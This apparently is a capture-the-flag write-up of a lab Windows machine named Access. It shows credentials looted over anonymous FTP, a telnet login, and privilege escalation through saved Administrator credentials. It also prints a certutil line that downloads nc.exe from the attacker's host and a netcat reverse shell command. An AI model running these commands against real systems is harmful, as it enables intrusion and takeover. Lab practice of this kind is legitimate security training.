
### Initial access
Port scan
```
PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
23/tcp open  telnet  syn-ack ttl 127 Microsoft Windows XP telnetd
| telnet-ntlm-info: 
|   Target_Name: ACCESS
|   NetBIOS_Domain_Name: ACCESS
|   NetBIOS_Computer_Name: ACCESS
|   DNS_Domain_Name: ACCESS
|   DNS_Computer_Name: ACCESS
|_  Product_Version: 6.1.7600
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp


```
subdomain scan
dirscan
filescan
Recon ftp
```
┌──(kali㉿kali)-[~/HTB/Access]
└─$ ftp 10.129.43.9                                                                                                                          
Connected to 10.129.43.9.
220 Microsoft FTP Service
Name (10.129.43.9:kali): ftp
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
425 Cannot open data connection.
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM       <DIR>          Backups
08-24-18  10:00PM       <DIR>          Engineer
226 Transfer complete.
ftp> cd Backups
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM              5652480 backup.mdb
226 Transfer complete.
ftp> get backup.mdb
local: backup.mdb remote: backup.mdb
200 PORT command successful.
125 Data connection already open; Transfer starting.
100% |***********************************************************************************************************************************************************************************************|  5520 KiB  526.61 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 28296 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
5652480 bytes received in 00:10 (526.60 KiB/s)
ftp> 
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-24-18  01:16AM                10870 Access Control.zip
226 Transfer complete.
ftp> get "Access Control.zip"
local: Access Control.zip remote: Access Control.zip
200 PORT command successful.
125 Data connection already open; Transfer starting.
100% |***********************************************************************************************************************************************************************************************| 10870       14.53 KiB/s    00:00 ETA
226 Transfer complete.
10870 bytes received in 00:00 (14.53 KiB/s)
ftp> 

```

Read backup first
```
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Access]
└─$ mdb-tables backup.mdb

acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock acc_levelset acc_levelset_door_group acc_linkageio acc_map acc_mapdoorpos acc_morecardempgroup acc_morecardgroup acc_timeseg acc_wiegandfmt ACGroup acholiday ACTimeZones action_log AlarmLog areaadmin att_attreport att_waitforprocessdata attcalclog attexception AuditedExc auth_group_permissions auth_message auth_permission auth_user auth_user_groups auth_user_user_permissions base_additiondata base_appoption base_basecode base_datatranslation base_operatortemplate base_personaloption base_strresource base_strtranslation base_systemoption CHECKEXACT CHECKINOUT dbbackuplog DEPARTMENTS deptadmin DeptUsedSchs devcmds devcmds_bak django_content_type django_session EmOpLog empitemdefine EXCNOTES FaceTemp iclock_dstime iclock_oplog iclock_testdata iclock_testdata_admin_area iclock_testdata_admin_dept LeaveClass LeaveClass1 Machines NUM_RUN NUM_RUN_DEIL operatecmds personnel_area personnel_cardtype personnel_empchange personnel_leavelog ReportItem SchClass SECURITYDETAILS ServerLog SHIFT TBKEY TBSMSALLOT TBSMSINFO TEMPLATE USER_OF_RUN USER_SPEDAY UserACMachines UserACPrivilege USERINFO userinfo_attarea UsersMachines UserUpdates worktable_groupmsg worktable_instantmsg worktable_msgtype worktable_usrmsg ZKAttendanceMonthStatistics acc_levelset_emp acc_morecardset ACUnlockComb AttParam auth_group AUTHDEVICE base_option dbapp_viewmodel FingerVein devlog HOLIDAYS personnel_issuecard SystemLog USER_TEMP_SCH UserUsedSClasses acc_monitor_log OfflinePermitGroups OfflinePermitUsers OfflinePermitDoors LossCard TmpPermitGroups TmpPermitUsers TmpPermitDoors ParamSet acc_reader acc_auxiliary STD_WiegandFmt CustomReport ReportField BioTemplate FaceTempEx FingerVeinEx TEMPLATEEx 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Access]
└─$ mdb-export backup.mdb auth_user

id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
                                                      
```

Unzip will password
```
──(kali㉿kali)-[~/HTB/Access]
└─$ 7z x Access\ Control.zip       


7-Zip 26.02 (x64) : Copyright (c) 1999-2026 Igor Pavlov : 2026-06-25
 64-bit locale=en_US.UTF-8 Threads:8 OPEN_MAX:4096, ASM

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: Access Control.zip
--
Path = Access Control.zip
Type = zip
Physical Size = 10870

    
Would you like to replace the existing file:
  Path:     ./Access Control.pst
  Size:     0 bytes
  Modified: 2018-08-23 20:13:52
with the file from archive:
  Path:     Access Control.pst
  Size:     271360 bytes (265 KiB)
  Modified: 2018-08-23 20:13:52
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? A

                         
Enter password (will not be echoed):
Everything is Ok

Size:       271360
Compressed: 10870

```

We see new cred
```bash {51}
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Access]
└─$ readpst Access\ Control.pst

Opening PST file and indexes...
Processing Folder "Deleted Items"
        "Access Control" - 2 items done, 0 items skipped.
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Access]
└─$ ls -la

total 5852
drwxrwxr-x  2 kali kali    4096 Sep 21 03:49  .
drwxrwxr-x 64 kali kali    4096 Sep 20 10:21  ..
-rw-rw-r--  1 kali kali       0 Sep 21 03:41  7z.hash
-rw-rw-r--  1 kali kali    3112 Sep 21 03:49 'Access Control.mbox'
-rw-rw-r--  1 kali kali  271360 Aug 23  2018 'Access Control.pst'
-rw-rw-r--  1 kali kali   10870 Aug 23  2018 'Access Control.zip'
-rw-rw-r--  1 kali kali 5652480 Aug 23  2018  backup.mdb
-rw-rw-r--  1 kali kali   21481 Sep 21 03:41  hash.txt
-rw-rw-r--  1 kali kali    1410 Sep 21 03:45  nmap_full
-rw-rw-r--  1 kali kali     522 Sep 21 03:34  nmap_ports.txt
-rw-rw-r--  1 kali kali    1318 Sep 21 03:34  nmap_sVsC.txt
-rw-rw-r--  1 kali kali     647 Sep 21 03:45  nmap_vuln.txt
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Access]
└─$ cat "Access Control.mbox"

From "john@megacorp.com" Thu Aug 23 19:44:07 2018
Status: RO
From: john@megacorp.com <john@megacorp.com>
Subject: MegaCorp Access Control System "security" account
To: 'security@accesscontrolsystems.com'
Date: Thu, 23 Aug 2018 23:44:07 +0000
MIME-Version: 1.0
Content-Type: multipart/mixed;
        boundary="--boundary-LibPST-iamunique-1063329721_-_-"


----boundary-LibPST-iamunique-1063329721_-_-
Content-Type: multipart/alternative;
        boundary="alt---boundary-LibPST-iamunique-1063329721_-_-"

--alt---boundary-LibPST-iamunique-1063329721_-_-
Content-Type: text/plain; charset="utf-8"

Hi there,

 

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.

 

Regards,

John


--alt---boundary-LibPST-iamunique-1063329721_-_-
Content-Type: text/html; charset="us-ascii"

<html xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:w="urn:schemas-microsoft-com:office:word" xmlns:m="http://schemas.microsoft.com/office/2004/12/omml" xmlns="http://www.w3.org/TR/REC-html40"><head><meta http-equiv=Content-Type content="text/html; charset=us-ascii"><meta name=Generator content="Microsoft Word 15 (filtered medium)"><style><!--
/* Font Definitions */
@font-face
        {font-family:"Cambria Math";
        panose-1:0 0 0 0 0 0 0 0 0 0;}
@font-face
        {font-family:Calibri;
        panose-1:2 15 5 2 2 2 4 3 2 4;}
/* Style Definitions */
p.MsoNormal, li.MsoNormal, div.MsoNormal
        {margin:0in;
        margin-bottom:.0001pt;
        font-size:11.0pt;
        font-family:"Calibri",sans-serif;}
a:link, span.MsoHyperlink
        {mso-style-priority:99;
        color:#0563C1;
        text-decoration:underline;}
a:visited, span.MsoHyperlinkFollowed
        {mso-style-priority:99;
        color:#954F72;
        text-decoration:underline;}
p.msonormal0, li.msonormal0, div.msonormal0
        {mso-style-name:msonormal;
        mso-margin-top-alt:auto;
        margin-right:0in;
        mso-margin-bottom-alt:auto;
        margin-left:0in;
        font-size:11.0pt;
        font-family:"Calibri",sans-serif;}
span.EmailStyle18
        {mso-style-type:personal-compose;
        font-family:"Calibri",sans-serif;
        color:windowtext;}
.MsoChpDefault
        {mso-style-type:export-only;
        font-size:10.0pt;
        font-family:"Calibri",sans-serif;}
@page WordSection1
        {size:8.5in 11.0in;
        margin:1.0in 1.0in 1.0in 1.0in;}
div.WordSection1
        {page:WordSection1;}
--></style><!--[if gte mso 9]><xml>
<o:shapedefaults v:ext="edit" spidmax="1026" />
</xml><![endif]--><!--[if gte mso 9]><xml>
<o:shapelayout v:ext="edit">
<o:idmap v:ext="edit" data="1" />
</o:shapelayout></xml><![endif]--></head><body lang=EN-US link="#0563C1" vlink="#954F72"><div class=WordSection1><p class=MsoNormal>Hi there,<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>The password for the &#8220;security&#8221; account has been changed to 4Cc3ssC0ntr0ller.&nbsp; Please ensure this is passed on to your engineers.<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>Regards,<o:p></o:p></p><p class=MsoNormal>John<o:p></o:p></p></div></body></html>
--alt---boundary-LibPST-iamunique-1063329721_-_---

----boundary-LibPST-iamunique-1063329721_-_---

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Access]
└─$ 

```

Cred `security:4Cc3ssC0ntr0ller`

```
┌──(kali㉿kali)-[~/HTB/Access]
└─$ telnet 10.129.43.9
Trying 10.129.43.9...
Connected to 10.129.43.9.
Escape character is '^]'.
Welcome to Microsoft Telnet Service 

login: security
password: 

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\security>whoami
access\security

C:\Users\security>



```

### Priv escalation

```
C:\tmp>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
    

```
Get revshell
```
C:\tmp>certutil -urlcache -split -f http://10.10.17.47/nc.exe C:\tmp\nc.exe && C:\tmp\nc.exe
****  Online  ****
  0000  ...
  96d8
CertUtil: -URLCache command completed successfully.
This program is blocked by group policy. For more information, contact your system administrator.

C:\tmp>dir
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\tmp

09/21/2026  09:01 AM    <DIR>          .
09/21/2026  09:01 AM    <DIR>          ..
09/21/2026  09:01 AM            38,616 nc.exe
               1 File(s)         38,616 bytes
               2 Dir(s)   3,345,821,696 bytes free

C:\tmp>runas /user:ACCESS\Administrator /savecred "C:\tmp\nc.exe 10.10.17.47 4444 -e cmd.exe"

```

```
┌──(kali㉿kali)-[~/HTB/Access]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.17.47] from (UNKNOWN) [10.129.43.9] 49159
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>cd /users
cd /users

C:\Users>whoami
whoami
access\administrator

```